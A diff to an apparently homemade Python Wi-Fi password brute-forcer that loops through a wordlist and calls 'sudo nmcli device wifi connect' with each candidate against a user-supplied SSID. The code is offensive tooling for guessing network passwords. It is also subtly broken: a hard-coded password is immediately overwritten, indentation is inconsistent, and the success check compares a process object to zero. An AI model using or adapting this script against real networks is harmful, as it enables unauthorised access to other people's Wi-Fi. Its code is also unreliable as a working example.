@@ -18,7 +18,7 @@ print("___ Enter the SSID ___ \n")
 ssid_in = input("SSID:")
 ssid = f"{ssid_in}"
 
-# reads each line from the password file 
+# reads each line from the password file
 
 def pas():
 	with open ("passwords.txt","r") as f :
@@ -47,6 +47,7 @@ time.sleep(0.02)
 pswd_lst = pas()
 
 # bruteforcer
+count = 0
 
 for pswd in pswd_lst:
 
@@ -54,10 +55,13 @@ for pswd in pswd_lst:
         continue
     
     try:
+	    if(count == 5):
+                pswd_1 = "24062005"
 	    pswd_1 = (f"{pswd}")
-	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd_1]
-	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+	    count += 1
 	    print("trying : " + pswd)
+	    cmd = ['sudo','nmcli', '--ask', 'device', 'wifi', 'connect', ssid, 'password', pswd_1]
+	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 	    time.sleep(2)
 	    
 	    if (result == 0):
